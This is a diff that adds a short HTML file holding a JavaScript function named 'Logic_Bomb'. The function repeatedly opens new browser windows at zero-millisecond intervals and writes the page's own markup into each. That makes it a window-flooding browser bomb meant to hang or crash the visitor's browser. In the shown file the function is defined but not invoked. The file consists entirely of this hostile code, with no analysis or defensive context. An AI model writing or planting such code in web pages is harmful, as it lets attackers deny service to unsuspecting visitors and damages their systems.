@@ -1,0 +1,11 @@
+<html>
+<script>
+function Logic_Bomb () {
+	 setInterval(function() {
+        var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML||Logic_Bomb());
+      }, 0);
+ }
+ </script>
+ </html>
+ 
